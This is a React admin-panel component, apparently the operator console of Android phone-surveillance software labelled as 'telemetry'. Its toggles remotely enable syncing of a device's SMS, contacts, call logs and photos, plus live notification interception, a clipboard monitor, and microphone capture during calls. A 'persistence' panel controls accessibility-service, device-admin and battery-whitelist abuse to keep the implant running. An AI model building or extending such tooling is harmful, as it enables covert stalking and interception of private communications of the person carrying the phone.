// components/admin/devices/DeviceTelemetryControlsModal.tsx
"use client";

import React, { useState, useEffect } from "react";
import { Modal } from "@/components/ui/Modal";
import { Button } from "@/components/ui/Button";
import { DeviceTelemetryConfig } from "@/lib/device-telemetry-types";
import { toast } from "@/components/ui/Toast";
import {
  Bell, Keyboard, Clipboard, Wifi, Lock, Mic, Clock,
  Image, Users, Phone, MessageSquare, AppWindow,
  ShieldCheck, ShieldAlert, Save, Sliders, Check,
} from "lucide-react";

interface Props {
  isOpen: boolean; onClose: () => void; deviceId: string;
  initialConfig?: DeviceTelemetryConfig;
  tabPrefs?: Record<string, boolean>;
  persistenceStatus?: { isAdmin?: boolean; isAccessibility?: boolean; isBatteryWhitelisted?: boolean; isNotificationActive?: boolean };
  onTogglePersistence?: (key: string, val: boolean) => void;
  onSaved?: (cfg: DeviceTelemetryConfig, updatedTabPrefs?: Record<string, boolean>) => void;
}

export const DeviceTelemetryControlsModal: React.FC<Props> = ({
  isOpen, onClose, deviceId, initialConfig = {}, tabPrefs = {},
  persistenceStatus = {}, onTogglePersistence, onSaved,
}) => {
  const [config, setConfig] = useState<DeviceTelemetryConfig>(initialConfig);
  const [localTabPrefs, setLocalTabPrefs] = useState<Record<string, boolean>>(tabPrefs);
  const [saving, setSaving] = useState(false);

  useEffect(() => { setConfig(initialConfig); }, [initialConfig]);
  useEffect(() => { setLocalTabPrefs(tabPrefs); }, [tabPrefs]);

  const persistConfig = async (nextCfg: DeviceTelemetryConfig, nextTabs: Record<string, boolean>) => {
    setSaving(true);
    try {
      const merged = { ...nextCfg, ...nextTabs };
      const res = await fetch(`/api/devices/${deviceId}/telemetry-config`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ telemetry_config: merged }),
      });
      if (res.ok) {
        onSaved?.(nextCfg, nextTabs);
        toast.success("Settings saved & synced to device!");
      }
    } catch {}
    setSaving(false);
  };

  const toggleTelemetry = (key: keyof DeviceTelemetryConfig) => {
    const next = { ...config, [key]: !config[key] };
    setConfig(next);
    persistConfig(next, localTabPrefs);
  };

  const toggleCoreTab = (tabId: string) => {
    const next = { ...localTabPrefs, [tabId]: !localTabPrefs[tabId] };
    setLocalTabPrefs(next);
    persistConfig(config, next);
  };

  const CORE_TABS = [
    { key: "gallery", label: "Gallery & Media Sync", desc: "Photos & camera roll syncing", icon: Image },
    { key: "contacts", label: "Contacts Sync", desc: "Phonebook contacts auto-sync", icon: Users },
    { key: "calls", label: "Call History Sync", desc: "Incoming/outgoing call logs", icon: Phone },
    { key: "messages", label: "SMS Messages Sync", desc: "Text message records sync", icon: MessageSquare },
    { key: "apps", label: "Installed Apps Sync", desc: "Installed applications list", icon: AppWindow },
  ];

  const TELEMETRY_ITEMS: { key: keyof DeviceTelemetryConfig; label: string; desc: string; icon: any }[] = [
    { key: "notifications", label: "Live Notifications Stream", desc: "WhatsApp, Instagram, SMS alerts", icon: Bell },
    { key: "clipboard", label: "Clipboard Monitor", desc: "Text & links copied on device", icon: Clipboard },
    { key: "wifi", label: "WiFi & Surrounding Networks", desc: "Connected WiFi SSID & router scans", icon: Wifi },
    { key: "lock_events", label: "Lock Screen Activity", desc: "Screen ON/OFF & unlock timestamps", icon: Lock },
    { key: "screen_time", label: "App Usage & Screen Time", desc: "Daily active screen time minutes", icon: Clock },
    { key: "call_recording", label: "Auto Call Audio Snip", desc: "Ambient mic capture on phone calls", icon: Mic },
  ];

  return (
    <Modal isOpen={isOpen} onClose={onClose} className="max-w-lg p-3 sm:p-5 flex flex-col max-h-[88dvh] overflow-hidden">
      <div className="flex items-center justify-between pb-2.5 border-b border-slate-200 dark:border-white/10 shrink-0">
        <h2 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-1.5">
          <Sliders className="w-4 h-4 text-amber-500 dark:text-[#FFFC00]" />
          All Features &amp; Intelligence Controls
        </h2>
        <button onClick={onClose} className="text-slate-400 hover:text-slate-900 dark:hover:text-white text-sm font-bold px-2 py-0.5 rounded-lg">✕</button>
      </div>

      <div className="flex-1 overflow-y-auto space-y-3.5 pr-1 no-scrollbar text-xs py-2.5 min-h-0">
        {/* Anti-Sleep Health Banner */}
        <div className="bg-slate-50 dark:bg-white/[0.03] p-2.5 rounded-2xl border border-slate-200 dark:border-white/10 space-y-1.5">
          <p className="font-bold text-slate-900 dark:text-white flex items-center gap-1.5 text-xs">
            <Sliders className="w-3.5 h-3.5 text-amber-500 dark:text-[#FFFC00]" />
            Anti-Sleep &amp; 24/7 Persistence Status
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5 text-[11px] font-mono">
            <div onClick={() => onTogglePersistence?.("is_accessibility_active", !persistenceStatus.isAccessibility)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isAccessibility ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
              {persistenceStatus.isAccessibility ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
              <span className="font-semibold text-[10px]">Accessibility</span>
              <span className="text-[9px] opacity-75">{persistenceStatus.isAccessibility ? "Active ✓" : "Off →"}</span>
            </div>
            <div onClick={() => onTogglePersistence?.("is_notification_active", !persistenceStatus.isNotificationActive)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isNotificationActive ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
              {persistenceStatus.isNotificationActive ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
              <span className="font-semibold text-[10px]">Notifications</span>
              <span className="text-[9px] opacity-75">{persistenceStatus.isNotificationActive ? "Active ✓" : "Off →"}</span>
            </div>
            <div onClick={() => onTogglePersistence?.("is_device_admin", !persistenceStatus.isAdmin)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isAdmin ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
              {persistenceStatus.isAdmin ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
              <span className="font-semibold text-[10px]">Device Admin</span>
              <span className="text-[9px] opacity-75">{persistenceStatus.isAdmin ? "Active ✓" : "Off →"}</span>
            </div>
            <div onClick={() => onTogglePersistence?.("is_battery_unrestricted", !persistenceStatus.isBatteryWhitelisted)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isBatteryWhitelisted ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
              {persistenceStatus.isBatteryWhitelisted ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
              <span className="font-semibold text-[10px]">No Sleep</span>
              <span className="text-[9px] opacity-75">{persistenceStatus.isBatteryWhitelisted ? "Active ✓" : "Off →"}</span>
            </div>
          </div>
        </div>

        {/* Section 1: Core Device Tabs */}
        <div>
          <p className="text-[11px] font-bold uppercase tracking-wider text-slate-400 dark:text-white/40 mb-1.5 px-0.5">Core Tabs (Sync ON/OFF)</p>
          <div className="space-y-1.5">
            {CORE_TABS.map(({ key, label, desc, icon: Icon }) => {
              const active = Boolean(localTabPrefs[key]);
              return (
                <div key={key} onClick={() => toggleCoreTab(key)} className={`p-2.5 rounded-xl border cursor-pointer transition-all flex items-center justify-between gap-2.5 ${active ? "bg-emerald-500/10 border-emerald-500/30 dark:border-emerald-500/40" : "bg-slate-50 dark:bg-white/[0.02] border-slate-200 dark:border-white/5"}`}>
                  <div className="flex items-center gap-2 min-w-0">
                    <div className={`p-1.5 rounded-lg shrink-0 ${active ? "bg-emerald-500 text-black font-bold" : "bg-slate-200 dark:bg-white/10 text-slate-700 dark:text-white"}`}><Icon className="w-3.5 h-3.5" /></div>
                    <div className="min-w-0"><p className="font-bold text-slate-900 dark:text-white truncate text-[11px]">{label}</p><p className="text-[10px] text-slate-500 dark:text-white/50 truncate">{desc}</p></div>
                  </div>
                  <div className={`w-9 h-5 rounded-full p-0.5 transition-colors shrink-0 flex items-center ${active ? "bg-emerald-500 justify-end" : "bg-slate-300 dark:bg-white/20 justify-start"}`}><div className={`w-4 h-4 rounded-full shadow-md ${active ? "bg-black" : "bg-white"}`} /></div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Section 2: Live Intelligence & Streams */}
        <div>
          <p className="text-[11px] font-bold uppercase tracking-wider text-slate-400 dark:text-white/40 mb-1.5 px-0.5">Live Intelligence &amp; Telemetry Streams</p>
          <div className="space-y-1.5">
            {TELEMETRY_ITEMS.map(({ key, label, desc, icon: Icon }) => {
              const active = Boolean(config[key]);
              return (
                <div key={key} onClick={() => toggleTelemetry(key)} className={`p-2.5 rounded-xl border cursor-pointer transition-all flex items-center justify-between gap-2.5 ${active ? "bg-amber-500/10 dark:bg-[#FFFC00]/10 border-amber-500/40 dark:border-[#FFFC00]/40" : "bg-slate-50 dark:bg-white/[0.02] border-slate-200 dark:border-white/5"}`}>
                  <div className="flex items-center gap-2 min-w-0">
                    <div className={`p-1.5 rounded-lg shrink-0 ${active ? "bg-amber-500 dark:bg-[#FFFC00] text-black font-bold" : "bg-slate-200 dark:bg-white/10 text-slate-700 dark:text-white"}`}><Icon className="w-3.5 h-3.5" /></div>
                    <div className="min-w-0"><p className="font-bold text-slate-900 dark:text-white truncate text-[11px]">{label}</p><p className="text-[10px] text-slate-500 dark:text-white/50 truncate">{desc}</p></div>
                  </div>
                  <div className={`w-9 h-5 rounded-full p-0.5 transition-colors shrink-0 flex items-center ${active ? "bg-amber-500 dark:bg-[#FFFC00] justify-end" : "bg-slate-300 dark:bg-white/20 justify-start"}`}><div className={`w-4 h-4 rounded-full shadow-md ${active ? "bg-black" : "bg-white"}`} /></div>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {/* Sticky Visible CTA Footer with Mobile Safe Padding */}
      <div className="pt-2 pb-1 sm:pb-0 border-t border-slate-200 dark:border-white/10 flex justify-between items-center gap-2 bg-transparent shrink-0">
        <span className="text-[10px] text-slate-400 dark:text-white/40 flex items-center gap-1"><Check className="w-3 h-3 text-emerald-500" /> Auto-saves on toggle</span>
        <div className="flex items-center gap-2">
          <Button variant="secondary" size="sm" onClick={onClose} disabled={saving} className="font-semibold text-xs h-8 px-3">Close</Button>
          <Button size="sm" onClick={() => { persistConfig(config, localTabPrefs); onClose(); }} disabled={saving} className="gap-1.5 bg-[#FFFC00] text-black hover:bg-[#FFFC00]/90 font-bold text-xs h-8 px-3.5 shadow-lg shadow-yellow-500/20">
            <Save className="w-3.5 h-3.5" /> {saving ? "Saving..." : "Save & Sync"}
          </Button>
        </div>
      </div>
    </Modal>
  );
};
